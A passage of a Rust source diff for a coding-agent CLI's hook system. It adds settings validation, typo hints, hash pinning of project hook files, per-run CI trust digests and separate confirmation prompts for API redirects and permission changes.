@@ -102,6 +102,36 @@ struct Hook {
     cmd: HookCmd,
     source: Source,
     timeout: Duration,
+    // `"on_error": "deny"`: a PreToolUse guard that exits non-zero (other
+    // than 2) blocks the call instead of letting it through with a warning.
+    deny_on_error: bool,
+    // Project hooks: the project files the hook runs, as they were when the
+    // folder was trusted, checked again before every run.
+    pins: Mutex<Vec<Pin>>,
+    // A change the user already refused to run (the files' states then).
+    refused: Mutex<Option<Vec<FileState>>>,
+}
+
+// A project file a hook runs, and its state when it was trusted.
+struct Pin {
+    shown: String,
+    full: PathBuf,
+    state: FileState,
+}
+
+#[derive(Clone, PartialEq, Debug)]
+enum FileState {
+    Hash([u8; 32]),
+    NotAFile,
+    Missing,
+}
+
+fn file_state(p: &Path) -> FileState {
+    match std::fs::read(p) {
+        Ok(bytes) => FileState::Hash(sha256(&bytes)),
+        Err(_) if p.exists() => FileState::NotAFile,
+        Err(_) => FileState::Missing,
+    }
 }
 
 struct Hooks {
@@ -109,6 +139,60 @@ struct Hooks {
 }
 
 static HOOKS: OnceLock<Hooks> = OnceLock::new();
+
+// Problems found in the hook settings at startup (unknown events and types),
+// shown once in the interactive transcript; headless runs print them on
+// stderr as they are found.
+static STARTUP_ISSUES: Mutex<Vec<String>> = Mutex::new(Vec::new());
+
+/// Events bwn fires. A hook under any other key never runs, so a typo is
+/// reported instead of ignored.
+const EVENTS: &[&str] = &[
+    "SessionStart",
+    "SessionEnd",
+    "UserPromptSubmit",
+    "PrePrompt",
+    "PostResponse",
+    "PreToolUse",
+    "PostToolUse",
+    "OnError",
+    "Stop",
+    "SubagentStop",
+];
+
+// Claude Code's tool names and the bwn tools each stands for, so a matcher
+// copied from a Claude Code settings file (`Write|Edit`, `Bash`) guards the
+// same calls here.
+const CLAUDE_CODE_TOOLS: &[(&str, &[&str])] = &[
+    ("Bash", &["run_command", "bash", "start_server"]),
+    (
+        "Edit",
+        &[
+            "edit_file",
+            "edit",
+            "patch",
+            "apply_patch",
+            "str_replace_editor",
+            "text_editor_20241022",
+            "text_editor_20250124",
+        ],
+    ),
+    ("MultiEdit", &["multi_edit"]),
+    ("Write", &["write_file", "write", "create_docx"]),
+    ("Read", &["read_file", "read", "read_many_files"]),
+    ("Grep", &["grep_files", "grep"]),
+    ("Glob", &["find_files", "find_paths", "glob"]),
+    ("LS", &["list_dir", "list", "list_tree"]),
+    ("WebFetch", &["fetch_url", "webfetch"]),
+    ("WebSearch", &["web_search", "websearch"]),
+    ("Task", &["task", "spawn_subagent"]),
+    ("TodoWrite", &["todo_write", "todowrite"]),
+    ("ExitPlanMode", &["exit_plan", "ExitPlanMode"]),
+];
+
+// Calls that end a turn or a plan. A catch-all `*` guard never sees them, so
+// a broken guard cannot keep a run from finishing; naming them still works.
+const CONTROL_TOOLS: &[&str] = &["finish", "exit_plan", "ExitPlanMode"];
 
 pub enum PreDecision {
     Continue,
@@ -119,12 +203,19 @@ pub enum PreDecision {
 pub fn init(cwd: &Path, interactive: bool) {
     let mut list = Vec::new();
 
+    let mut issues = Vec::new();
     // Explicit hooks from settings files.
-    if let Ok(text) = std::fs::read_to_string(config::home().join("settings.json")) {
-        parse_into(&text, Source::Home, &mut list);
-    }
-    if let Ok(text) = std::fs::read_to_string(config::home().join("settings.local.json")) {
-        parse_into(&text, Source::Home, &mut list);
+    for name in ["settings.json", "settings.local.json"] {
+        let path = config::home().join(name);
+        if let Ok(text) = std::fs::read_to_string(&path) {
+            let mut found = Vec::new();
+            parse_checked(&text, Source::Home, &mut list, &mut found);
+            issues.extend(
+                found
+                    .into_iter()
+                    .map(|i| format!("{i} ({})", path.display())),
+            );
+        }
     }
     // Trust is asked for once by `trust_project`; here it is only checked.
     for name in config::PROJECT_SETTINGS_FILES {
@@ -132,7 +223,17 @@ pub fn init(cwd: &Path, interactive: bool) {
             continue;
         };
         if project_file_trusted(cwd, name, &text) {
-            parse_into(&text, Source::Project, &mut list);
+            let mut found = Vec::new();
+            let first = list.len();
+            parse_checked(&text, Source::Project, &mut list, &mut found);
+            for h in &mut list[first..] {
+                *h.pins.get_mut().unwrap_or_else(|e| e.into_inner()) = hook_pins(cwd, &h.cmd);
+            }
+            issues.extend(
+                found
+                    .into_iter()
+                    .map(|i| format!("{i} (.buildwithnexus/{name})")),
+            );
         } else if interactive && has_hooks(&text) {
             tui::line(&tui::dim(&format!(
                 "  (hooks in .buildwithnexus/{name} are not trusted — skipped)"
@@ -141,18 +242,7 @@ pub fn init(cwd: &Path, interactive: bool) {
     }
 
     // Auto-discovered scripts from ~/.buildwithnexus/hooks/<Event>/.
-    for event in &[
-        "SessionStart",
-        "SessionEnd",
-        "UserPromptSubmit",
-        "PrePrompt",
-        "PostResponse",
-        "PreToolUse",
-        "PostToolUse",
-        "OnError",
-        "Stop",
-        "SubagentStop",
-    ] {
+    for event in EVENTS {
         for script in config::discover_hook_scripts(event) {
             list.push(Hook {
                 event: event.to_string(),
@@ -160,11 +250,40 @@ pub fn init(cwd: &Path, interactive: bool) {
                 cmd: HookCmd::Script(script),
                 source: Source::Home,
                 timeout: Duration::from_secs(DEFAULT_HOOK_TIMEOUT_SECS),
+                deny_on_error: false,
+                pins: Mutex::new(Vec::new()),
+                refused: Mutex::new(None),
             });
         }
     }
 
     let _ = HOOKS.set(Hooks { list });
+    // Settings text and keys come from files a checkout can carry.
+    let issues: Vec<String> = issues
+        .iter()
+        .map(|i| tui::sanitize_terminal(i).into_owned())
+        .collect();
+    if interactive {
+        if let Ok(mut s) = STARTUP_ISSUES.lock() {
+            s.extend(issues);
+        }
+    } else {
+        for i in issues {
+            eprintln!(
+                "{}",
+                tui::yellow(&format!("buildwithnexus: warning: hooks: {i}"))
+            );
+        }
+    }
+}
+
+/// Hook settings problems found at startup, once: the REPL shows them after
+/// the banner (they would be lost behind the alternate screen otherwise).
+pub fn take_startup_issues() -> Vec<String> {
+    STARTUP_ISSUES
+        .lock()
+        .map(|mut s| std::mem::take(&mut *s))
+        .unwrap_or_default()
 }
 
 fn has_hooks(text: &str) -> bool {
@@ -174,7 +293,15 @@ fn has_hooks(text: &str) -> bool {
         .unwrap_or(false)
 }
 
+#[cfg(test)]
 fn parse_into(text: &str, source: Source, out: &mut Vec<Hook>) {
+    parse_checked(text, source, out, &mut Vec::new());
+}
+
+// Reads the `hooks` block of a settings file into `out`. Anything that can
+// never run (an event bwn does not fire, an unknown handler type, a handler
+// without its command) is reported in `issues` instead of dropped silently.
+fn parse_checked(text: &str, source: Source, out: &mut Vec<Hook>, issues: &mut Vec<String>) {
     let Ok(v) = serde_json::from_str::<Value>(text) else {
         return;
     };
@@ -182,56 +309,139 @@ fn parse_into(text: &str, source: Source, out: &mut Vec<Hook>) {
         return;
     };
     for (event, groups) in events {
+        if !EVENTS.contains(&event.as_str()) {
+            let hint = did_you_mean(event, EVENTS)
+                .map(|e| format!(" (did you mean {e}?)"))
+                .unwrap_or_else(|| format!(" (events: {})", EVENTS.join(", ")));
+            issues.push(format!(
+                "unknown hook event {event}{hint} — its hooks never run"
+            ));
+            continue;
+        }
         let Some(groups) = groups.as_array() else {
+            issues.push(format!("hooks.{event} must be a list of matcher groups"));
             continue;
         };
         for g in groups {
             let matcher = g["matcher"].as_str().unwrap_or("*").to_string();
-            if let Some(hs) = g["hooks"].as_array() {
-                for h in hs {
-                    let cmd = match h["type"].as_str() {
-                        Some("command") => {
-                            h["command"].as_str().map(|c| HookCmd::Shell(c.to_string()))
+            for h in g["hooks"].as_array().into_iter().flatten() {
+                let ty = h["type"].as_str();
+                let cmd = match ty {
+                    Some("command") => h["command"].as_str().map(|c| HookCmd::Shell(c.to_string())),
+                    Some("python") => h["script"]
+                        .as_str()
+                        .or_else(|| h["path"].as_str())
+                        .map(|p| HookCmd::Script(PathBuf::from(p))),
+                    Some("script") => h["path"]
+                        .as_str()
+                        .or_else(|| h["script"].as_str())
+                        .map(|p| HookCmd::Script(PathBuf::from(p))),
+                    _ => None,
+                };
+                let Some(cmd) = cmd else {
+                    issues.push(match ty {
+                        Some(t @ ("command" | "python" | "script")) => {
+                            let field = if t == "command" { "command" } else { "path" };
+                            format!("a {event} hook of type {t} has no \"{field}\" — skipped")
                         }
-                        Some("python") => h["script"]
-                            .as_str()
-                            .or_else(|| h["path"].as_str())
-                            .map(|p| HookCmd::Script(PathBuf::from(p))),
-                        Some("script") => h["path"]
-                            .as_str()
-                            .or_else(|| h["script"].as_str())
-                            .map(|p| HookCmd::Script(PathBuf::from(p))),
-                        _ => None,
-                    };
-                    if let Some(cmd) = cmd {
-                        // Optional per-hook `"timeout"` in seconds (Claude Code compatible).
-                        let timeout = h["timeout"]
-                            .as_u64()
-                            .filter(|&t| t > 0)
-                            .unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS);
-                        out.push(Hook {
-                            event: event.clone(),
-                            matcher: matcher.clone(),
-                            cmd,
-                            source,
-                            timeout: Duration::from_secs(timeout),
-                        });
+                        Some(t) => format!(
+                            "unknown hook type {t} in {event} (use command, python or script) — skipped"
+                        ),
+                        None => format!(
+                            "a {event} hook has no \"type\" (use command, python or script) — skipped"
+                        ),
+                    });
+                    continue;
+                };
+                // Optional per-hook `"timeout"` in seconds (Claude Code compatible).
+                let timeout = h["timeout"]
+                    .as_u64()
+                    .filter(|&t| t > 0)
+                    .unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS);
+                let deny_on_error = match h["on_error"].as_str() {
+                    None | Some("allow") => false,
+                    Some("deny") => true,
+                    Some(other) => {
+                        issues.push(format!(
+                            "unknown on_error {other} in {event} (use allow or deny) — using allow"
+                        ));
+                        false
                     }
-                }
+                };
+                out.push(Hook {
+                    event: event.clone(),
+                    matcher: matcher.clone(),
+                    cmd,
+                    source,
+                    timeout: Duration::from_secs(timeout),
+                    deny_on_error,
+                    pins: Mutex::new(Vec::new()),
+                    refused: Mutex::new(None),
+                });
             }
         }
     }
 }
 
+// The known name a typo was most likely meant to be: same letters in another
+// case, or at most two edits away.
+fn did_you_mean<'a>(word: &str, known: &[&'a str]) -> Option<&'a str> {
+    if let Some(k) = known.iter().find(|k| k.eq_ignore_ascii_case(word)) {
+        return Some(k);
+    }
+    known
+        .iter()
+        .map(|k| {
+            (
+                edit_distance(&word.to_ascii_lowercase(), &k.to_ascii_lowercase()),
+                *k,
+            )
+        })
+        .filter(|(d, _)| *d <= 2)
+        .min_by_key(|(d, _)| *d)
+        .map(|(_, k)| k)
+}
+
+fn edit_distance(a: &str, b: &str) -> usize {
+    let b: Vec<char> = b.chars().collect();
+    let mut prev: Vec<usize> = (0..=b.len()).collect();
+    for (i, ca) in a.chars().enumerate() {
+        let mut cur = vec![i + 1];
+        for (j, cb) in b.iter().enumerate() {
+            let sub = prev[j] + usize::from(ca != *cb);
+            cur.push(sub.min(prev[j + 1] + 1).min(cur[j] + 1));
+        }
+        prev = cur;
+    }
+    prev[b.len()]
+}
+
 fn matches(matcher: &str, tool: &str) -> bool {
     let m = matcher.trim();
-    m.is_empty() || m == "*" || m.split('|').any(|p| glob_match(p.trim(), tool))
+    if m.is_empty() || m == "*" || m == ".*" {
+        return !CONTROL_TOOLS.contains(&tool);
+    }
+    tool_matches(m, tool)
+}
+
+/// Whether a matcher (`write_file|edit_file`, `Write|Edit`, `mcp__*`,
+/// Claude Code's regex-style `mcp__.*`) names `tool`. Each `|` part is a
+/// case-sensitive wildcard pattern, or a Claude Code tool name standing for
+/// the bwn tools that do the same thing. Also used by permission rules.
+pub(crate) fn tool_matches(matcher: &str, tool: &str) -> bool {
+    matcher.split('|').any(|part| {
+        let part = part.trim().replace(".*", "*");
+        glob_match(&part, tool)
+            || CLAUDE_CODE_TOOLS
+                .iter()
+                .any(|(cc, ours)| *cc == part && ours.contains(&tool))
+    })
 }
 
 // Case-sensitive wildcard match: `*` spans any run of characters (including
 // none), `?` exactly one. Hand-rolled (no regex crate) with the classic
 // single-backtrack-point algorithm, so it runs in O(n·m) worst case.
-fn glob_match(pattern: &str, text: &str) -> bool {
+pub(crate) fn glob_match(pattern: &str, text: &str) -> bool {
     let p: Vec<char> = pattern.chars().collect();
     let t: Vec<char> = text.chars().collect();
     let (mut pi, mut ti) = (0usize, 0usize);
@@ -303,7 +513,17 @@ thread_local! {
     static TEST_HOOKS: std::cell::RefCell<Option<Vec<Hook>>> = const { std::cell::RefCell::new(None) };
 }
 
-fn commands_for(event: &str, tool: Option<&str>) -> Vec<(HookCmd, Source, String, Duration)> {
+// One hook chosen to run for an event.
+struct Selected {
+    index: usize,
+    cmd: HookCmd,
+    source: Source,
+    matcher: String,
+    timeout: Duration,
+    deny_on_error: bool,
+}
+
+fn commands_for(event: &str, tool: Option<&str>) -> Vec<Selected> {
     #[cfg(test)]
     if let Some(found) = TEST_HOOKS.with(|t| {
         t.borrow()
@@ -318,16 +538,107 @@ fn commands_for(event: &str, tool: Option<&str>) -> Vec<(HookCmd, Source, String
     select_hooks(&h.list, event, tool)
 }
 
-fn select_hooks(
-    list: &[Hook],
-    event: &str,
-    tool: Option<&str>,
-) -> Vec<(HookCmd, Source, String, Duration)> {
+fn select_hooks(list: &[Hook], event: &str, tool: Option<&str>) -> Vec<Selected> {
     list.iter()
-        .filter(|hk| hk.event == event)
-        .filter(|hk| tool.is_none_or(|t| matches(&hk.matcher, t)))
-        .map(|hk| (hk.cmd.clone(), hk.source, hk.matcher.clone(), hk.timeout))
+        .enumerate()
+        .filter(|(_, hk)| hk.event == event)
+        .filter(|(_, hk)| tool.is_none_or(|t| matches(&hk.matcher, t)))
+        .map(|(index, hk)| Selected {
+            index,
+            cmd: hk.cmd.clone(),
+            source: hk.source,
+            matcher: hk.matcher.clone(),
+            timeout: hk.timeout,
+            deny_on_error: hk.deny_on_error,
+        })
         .collect()
+}
+
+// The project files a hook's command or script runs, pinned as they are now.
+fn hook_pins(cwd: &Path, cmd: &HookCmd) -> Vec<Pin> {
+    let mut refs = Vec::new();
+    match cmd {
+        HookCmd::Shell(c) => command_refs(command_words(c), &mut refs),
+        HookCmd::Script(p) => refs.push(TrustRef {
+            path: p.to_string_lossy().into_owned(),
+            if_present: false,
+        }),
+    }
+    // A bare word that may name a file is pinned too: creating it later is
+    // a change.
+    resolve_refs(cwd, refs, false)
+        .into_iter()
+        .map(|(shown, full, _)| Pin {
+            state: file_state(&full),
+            shown,
+            full,
+        })
+        .collect()
+}
+
+// Whether project hook `index` may run: every file it runs must be as it was
+// when the folder was trusted. On a change the user is asked (interactive;
+// yes runs it and accepts the change for this session) or the hook is
+// skipped with a warning (headless). A refused change is not asked again.
+fn still_trusted(index: usize, event: &str) -> bool {
+    let Some(h) = HOOKS.get().and_then(|hooks| hooks.list.get(index)) else {
+        return true;
+    };
+    let interactive = !report::is_json() && std::io::IsTerminal::is_terminal(&std::io::stdin());
+    hook_still_trusted(h, event, interactive, tui::ask)
+}
+
+fn hook_still_trusted(
+    h: &Hook,
+    event: &str,
+    interactive: bool,
+    ask: impl FnOnce(&str) -> Option<String>,
+) -> bool {
+    if h.source != Source::Project {
+        return true;
+    }
+    let Ok(mut pins) = h.pins.lock() else {
+        return false;
+    };
+    let now: Vec<FileState> = pins.iter().map(|p| file_state(&p.full)).collect();
+    let changed: Vec<String> = pins
+        .iter()
+        .zip(&now)
+        .filter(|(p, s)| p.state != **s)
+        .map(|(p, _)| shown(&p.shown))
+        .collect();
+    if changed.is_empty() {
+        return true;
+    }
+    let mut refused = h.refused.lock().unwrap_or_else(|e| e.into_inner());
+    if refused.as_ref() == Some(&now) {
+        return false;
+    }
+    let names = changed.join(", ");
+    let it = if changed.len() == 1 { "it" } else { "them" };
+    if interactive {
+        // The question on its own line; the input box keeps a short label.
+        tui::line(&tui::yellow(&format!(
+            "  ⚠ {names} changed since you trusted {it} — run it? [y/N] ({event} hook)"
+        )));
+        let yes = ask(&format!("  run it? {} ", tui::dim("[y/N]")))
+            .is_some_and(|a| matches!(a.trim().to_lowercase().as_str(), "y" | "yes"));
+        if yes {
+            for (p, s) in pins.iter_mut().zip(now) {
+                p.state = s;
+            }
+            return true;
+        }
+        tui::line(&tui::dim(&format!(
+            "  (skipped the {event} hook: {names} changed since you trusted {it})"
+        )));
+    } else {
+        hook_warn(&format!(
+            "{event} hook skipped: {names} changed since this folder was trusted — review the change, then trust the folder again"
+        ));
+    }
+    *refused = Some(now);
+    false
 }
 
 fn source_label(source: Source) -> &'static str {
@@ -561,12 +872,22 @@ fn trust_refs(text: &str) -> Vec<TrustRef> {
 // The references in `text` that are, or may later be, files inside the
 // project: (as written, joined to `cwd`, canonical path if it exists).
 fn project_refs(cwd: &Path, text: &str) -> Vec<(String, PathBuf, Option<PathBuf>)> {
+    resolve_refs(cwd, trust_refs(text), true)
+}
+
+// `refs` that are, or may later be, files inside the project. With
+// `skip_absent`, an `if_present` reference counts only while it exists.
+fn resolve_refs(
+    cwd: &Path,
+    refs: Vec<TrustRef>,
+    skip_absent: bool,
+) -> Vec<(String, PathBuf, Option<PathBuf>)> {
     let root = cwd.canonicalize().unwrap_or_else(|_| cwd.to_path_buf());
     let mut out = Vec::new();
     for TrustRef {
         path: r,
         if_present,
-    } in trust_refs(text)
+    } in refs
     {
         let p = Path::new(&r);
         let full = if p.is_absolute() {
@@ -575,7 +896,7 @@ fn project_refs(cwd: &Path, text: &str) -> Vec<(String, PathBuf, Option<PathBuf>
             cwd.join(p)
         };
         let canon = full.canonicalize().ok();
-        if if_present && !canon.as_ref().is_some_and(|c| c.is_file()) {
+        if skip_absent && if_present && !canon.as_ref().is_some_and(|c| c.is_file()) {
             continue;
         }
         // Relative references that don't exist yet may appear inside the
@@ -614,6 +935,16 @@ pub fn trust_digest(cwd: &Path, text: &str) -> String {
     format!("sha256:{}", hex(&sha256(&buf)))
 }
 
+// Digests trusted for this run only (`--trust-project`), never stored:
+// (settings file name, digest).
+static RUN_TRUST: Mutex<Vec<(String, String)>> = Mutex::new(Vec::new());
+
+fn trusted_for_this_run(name: &str, digest: &str) -> bool {
+    RUN_TRUST
+        .lock()
+        .is_ok_and(|t| t.iter().any(|(n, d)| n == name && d == digest))
+}
+
 fn read_trust_store() -> Value {
     std::fs::read_to_string(trust_path())
         .ok()
@@ -624,12 +955,49 @@ fn read_trust_store() -> Value {
 
 /// Has the user trusted exactly this content of `<cwd>/.buildwithnexus/<name>`?
 /// Never prompts.
-pub fn project_file_trusted(cwd: &Path, name: &str, text: &str) -> bool {
-    let store = read_trust_store();
-    store[config::project_key(cwd)][name].as_str() == Some(trust_digest(cwd, text).as_str())
+/// Whether the user has answered the trust prompt for this folder (any of
+/// its settings files, at any version).
+pub fn folder_reviewed(cwd: &Path) -> bool {
+    read_trust_store()
+        .get(config::project_key(cwd))
+        .is_some_and(|e| e.as_object().is_none_or(|m| !m.is_empty()))
 }
 
+pub fn project_file_trusted(cwd: &Path, name: &str, text: &str) -> bool {
+    project_trust(cwd, name, text).is_some()
+}
+
+/// None when `<cwd>/.buildwithnexus/<name>` is not trusted at exactly this
+/// content; otherwise the keys the user said no to on their own (`base_url`,
+/// `permission`), which apply only where they tighten, as in an untrusted
+/// file. A store entry is the digest (all trusted) or {"digest", "declined"}.
+pub fn project_trust(cwd: &Path, name: &str, text: &str) -> Option<Vec<String>> {
+    let digest = trust_digest(cwd, text);
+    if trusted_for_this_run(name, &digest) {
+        return Some(Vec::new());
+    }
+    let store = read_trust_store();
+    let entry = &store[config::project_key(cwd)][name];
+    if entry.as_str() == Some(digest.as_str()) {
+        return Some(Vec::new());
+    }
+    (entry["digest"].as_str() == Some(digest.as_str())).then(|| {
+        entry["declined"]
+            .as_array()
+            .into_iter()
+            .flatten()
+            .filter_map(|k| k.as_str().map(str::to_string))
+            .collect()
+    })
+}
+
+#[cfg(test)]
 pub(crate) fn store_trust(cwd: &Path, files: &[config::UntrustedProjectFile]) {
+    store_trust_declining(cwd, files, &[]);
+}
+
+// Records trust in `files` as they are now, minus the `declined` keys.
+fn store_trust_declining(cwd: &Path, files: &[config::UntrustedProjectFile], declined: &[&str]) {
     let mut store = read_trust_store();
     let key = config::project_key(cwd);
     // Entries written before per-file trust were a bare digest string.
@@ -637,7 +1005,17 @@ pub(crate) fn store_trust(cwd: &Path, files: &[config::UntrustedProjectFile]) {
         store[&key] = json!({});
     }
     for f in files {
-        store[&key][f.name] = json!(trust_digest(cwd, &f.text));
+        let digest = trust_digest(cwd, &f.text);
+        let no: Vec<&str> = declined
+            .iter()
+            .copied()
+            .filter(|k| f.keys.iter().any(|fk| fk == k))
+            .collect();
+        store[&key][f.name] = if no.is_empty() {
+            json!(digest)
+        } else {
+            json!({"digest": digest, "declined": no})
+        };
     }
     if let Ok(t) = serde_json::to_string_pretty(&store) {
         config::ensure_home();
@@ -778,11 +1156,142 @@ pub fn trust_prompt_lines(cwd: &Path, pending: &[config::UntrustedProjectFile]) 
     out
 }
 
+// ── trusting a folder on purpose, for one run (CI) ───────────────────────────
+// `buildwithnexus trust --print` shows one digest over every project
+// settings file and system.md (each with the files it runs); `--trust-project
+// <digest>` or BWN_TRUST_PROJECT=<digest> trusts exactly that content for
+// this run, without writing trusted.json.
+
+static RUN_TRUST_DIGEST: Mutex<Option<String>> = Mutex::new(None);
+
+/// The `--trust-project` value, if one was given (the flag wins over
+/// BWN_TRUST_PROJECT).
+pub fn set_trust_digest(flag: Option<String>) {
+    let d = flag.or_else(|| {
+        std::env::var("BWN_TRUST_PROJECT")
+            .ok()
+            .filter(|v| !v.trim().is_empty())
+    });
+    if let Ok(mut t) = RUN_TRUST_DIGEST.lock() {
+        *t = d.map(|d| d.trim().to_string());
+    }
+}
+
+// Every project settings file and system.md here, as (name, text).
+fn project_files(cwd: &Path) -> Vec<config::UntrustedProjectFile> {
+    let mut out = Vec::new();
+    for name in config::PROJECT_SETTINGS_FILES {
+        if let Ok(text) = std::fs::read_to_string(cwd.join(".buildwithnexus").join(name)) {
+            let keys = serde_json::from_str::<Value>(&text)
+                .ok()
+                .and_then(|v| v.as_object().map(|m| m.keys().cloned().collect()))
+                .unwrap_or_default();
+            out.push(config::UntrustedProjectFile { name, text, keys });
+        }
+    }
+    if let Some(text) = config::project_system_md(cwd) {
+        out.push(config::UntrustedProjectFile {
+            name: config::PROJECT_SYSTEM_PROMPT,
+            text,
+            keys: vec!["system prompt".into()],
+        });
+    }
+    out
+}
+
+/// The digest `--trust-project` takes for this folder, or None when it has
+/// no project settings.
+pub fn project_digest(cwd: &Path) -> Option<String> {
+    let files = project_files(cwd);
+    if files.is_empty() {
+        return None;
+    }
+    let mut buf = Vec::new();
+    for f in &files {
+        buf.extend_from_slice(f.name.as_bytes());
+        buf.push(0);
+        buf.extend_from_slice(trust_digest(cwd, &f.text).as_bytes());
+        buf.push(b'\n');
+    }
+    Some(format!("sha256:{}", hex(&sha256(&buf))))
+}
+
+/// `buildwithnexus trust --print`: the digest on stdout (for a CI variable)
+/// and, on stderr, what trusting it allows.
+pub fn trust_cli(args: &[String]) -> i32 {
+    if !args.iter().all(|a| a == "--print") {
+        eprintln!("usage: buildwithnexus trust --print");
+        return 2;
+    }
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    let Some(digest) = project_digest(&cwd) else {
+        eprintln!("no project settings here (.buildwithnexus/settings.json, settings.local.json or system.md)");
+        return 0;
+    };
+    println!("{digest}");
+    for l in trust_prompt_lines(&cwd, &project_files(&cwd)) {
+        eprintln!("  {l}");
+    }
+    eprintln!(
+        "trust exactly this in CI: buildwithnexus run --trust-project {digest} '<task>'  (or BWN_TRUST_PROJECT={digest})"
+    );
+    0
+}
+
+// A `--trust-project` digest for this run: trusts every project file when it
+// matches; any other value is a usage error that names what changed.
+fn apply_run_trust(cwd: &Path) {
+    let Some(given) = RUN_TRUST_DIGEST.lock().ok().and_then(|t| t.clone()) else {
+        return;
+    };
+    let files = project_files(cwd);
+    if project_digest(cwd).as_deref() == Some(given.as_str()) {
+        if let Ok(mut t) = RUN_TRUST.lock() {
+            for f in &files {
+                t.push((f.name.to_string(), trust_digest(cwd, &f.text)));
+            }
+        }
+        return;
+    }
+    let mut covered: Vec<String> = files
+        .iter()
+        .map(|f| format!(".buildwithnexus/{}", f.name))
+        .collect();
+    for f in &files {
+        for (r, _, canon) in project_refs(cwd, &f.text) {
+            if canon.is_some_and(|c| c.is_file()) && !covered.contains(&r) {
+                covered.push(r);
+            }
+        }
+    }
+    let what = if covered.is_empty() {
+        "this folder has no project settings".to_string()
+    } else {
+        format!(
+            "the project settings changed since that digest was made: {} changed",
+            covered
+                .iter()
+                .map(|c| shown(c))
+                .collect::<Vec<_>>()
+                .join(" or ")
+        )
+    };
+    eprintln!(
+        "{}",
+        tui::red(&format!(
+            "buildwithnexus: --trust-project: {what} — review the change, then use the digest from `buildwithnexus trust --print`"
+        ))
+    );
+    std::process::exit(2);
+}
+
 /// Called once at startup, before settings are used. Project settings keys
 /// that could run code, redirect the API key, or loosen the gate are ignored
 /// until the user trusts that file. Interactive: one prompt naming every such
-/// key. Otherwise: one stderr warning, never a prompt.
+/// key. Otherwise: one stderr warning, never a prompt. A `--trust-project`
+/// digest trusts the folder for this run instead.
 pub fn trust_project(cwd: &Path, interactive: bool) {
+    apply_run_trust(cwd);
     let pending = config::untrusted_project_files(cwd);
     if pending.is_empty() {
         return;
@@ -799,7 +1308,8 @@ pub fn trust_project(cwd: &Path, interactive: bool) {
             "{}",
             tui::yellow(&format!(
                 "buildwithnexus: warning: ignoring untrusted project settings in {} ({}). \
-                 Run bwn in a terminal there to review and trust them.",
+                 Run bwn in a terminal there to review and trust them, or trust them for one run \
+                 with --trust-project <digest> (`buildwithnexus trust --print` shows it).",
                 shown_cwd,
                 listing.join("; ")
             ))
@@ -821,18 +1331,69 @@ pub fn trust_project(cwd: &Path, interactive: bool) {
             "    (settings for this folder changed since you last trusted them)",
         ));
     }
-    let ans = tui::ask(&format!(
-        "  Trust these project settings? {} ",
-        tui::dim("[y/N]")
-    ))
-    .unwrap_or_default();
-    if matches!(ans.trim().to_lowercase().as_str(), "y" | "yes") {
-        store_trust(cwd, &pending);
-    } else {
+    let yes = |q: &str| {
+        tui::ask(&format!("  {q} {} ", tui::dim("[y/N]")))
+            .is_some_and(|a| matches!(a.trim().to_lowercase().as_str(), "y" | "yes"))
+    };
+    // Sending requests (and the key) elsewhere and loosening approvals each
+    // get their own question; everything else is one decision.
+    let has = |k: &str| pending.iter().any(|f| f.keys.iter().any(|fk| fk == k));
+    let general = pending.iter().any(|f| {
+        f.keys
+            .iter()
+            .any(|k| !SEPARATE_TRUST_KEYS.contains(&k.as_str()))
+    });
+    if general && !yes("Trust these project settings (hooks, MCP servers and the rest above)?") {
         tui::line(&tui::dim(
             "  (untrusted project settings ignored; harmless ones like model still apply)",
         ));
+        return;
     }
+    let mut declined: Vec<&str> = Vec::new();
+    if has("base_url") {
+        let url = project_value(&pending, "base_url");
+        if !yes(&format!(
+            "this repo wants your requests (and API key) sent to {url} — allow?"
+        )) {
+            declined.push("base_url");
+        }
+    }
+    if has("permission") {
+        let perm = project_value(&pending, "permission");
+        if !yes(&format!("this repo sets permission: {perm} — allow?")) {
+            declined.push("permission");
+        }
+    }
+    if !general && declined.len() == SEPARATE_TRUST_KEYS.iter().filter(|k| has(k)).count() {
+        // Nothing was accepted: ask again next time, as for a plain "no".
+        return;
+    }
+    store_trust_declining(cwd, &pending, &declined);
+    if !declined.is_empty() {
+        tui::line(&tui::dim(&format!(
+            "  (trusted, except {} — your own settings apply there)",
+            declined.join(" and ")
+        )));
+    }
+}
+
+// Project keys asked about on their own in the trust prompt.
+const SEPARATE_TRUST_KEYS: &[&str] = &["base_url", "permission"];
+
+// A key's value as the pending files set it (the last file wins, as in the
+// merge), shown on one line.
+fn project_value(pending: &[config::UntrustedProjectFile], key: &str) -> String {
+    pending
+        .iter()
+        .rev()
+        .filter_map(|f| serde_json::from_str::<Value>(&f.text).ok())
+        .find_map(|v| match &v[key] {
+            Value::Null => None,
+            Value::String(s) => Some(s.clone()),
+            other => Some(other.to_string()),
+        })
+        .map(|v| shown(&v))
+        .unwrap_or_default()
 }
 
 // ── execution ────────────────────────────────────────────────────────────────
@@ -1068,14 +1629,14 @@ fn hook_warn(msg: &str) {
 }
 
 // What to do about a hook that failed, for the message that names it.
-fn fix_hint(source: Source, cmd: &HookCmd, failure: &HookFailure) -> String {
+fn fix_hint(source: Source, cmd: &HookCmd, failure: Option<&HookFailure>) -> String {
     let discovered = matches!(cmd, HookCmd::Script(p)
         if source == Source::Home && p.starts_with(config::home().join("hooks")));
     let fix = match failure {
-        HookFailure::TimedOut(_) if !discovered => {
+        Some(HookFailure::TimedOut(_)) if !discovered => {
             "Make it finish sooner or raise its \"timeout\" (seconds)"
         }
-        HookFailure::TimedOut(_) => "Make it finish sooner",
+        Some(HookFailure::TimedOut(_)) => "Make it finish sooner",
         _ => "Fix it",
     };
     let file = match source {
@@ -1101,20 +1662,33 @@ fn problem_message(event: &str, source: Source, cmd: &HookCmd, run: &HookRun) ->
         return Some(format!(
             "{event} hook `{label}` {}. {}",
             f.describe(),
-            fix_hint(source, cmd, f)
+            fix_hint(source, cmd, Some(f))
         ));
     }
     if run.code == 0 {
         return None;
     }
-    let detail = match first_line(&run.stderr) {
-        "" => String::new(),
-        l => format!(": {}", trace::preview(l, 200)),
-    };
     Some(format!(
-        "{event} hook `{label}` exited {}{detail}",
-        run.code
+        "{event} hook `{label}` exited {}{}",
+        run.code,
+        stderr_detail(&run.stderr)
     ))
+}
+
+// The end of a failed hook's stderr, where a traceback names the error
+// (`KeyError: 'tool_input'`): its last few non-empty lines on one line.
+fn stderr_detail(stderr: &str) -> String {
+    const LINES: usize = 3;
+    let lines: Vec<&str> = stderr
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty())
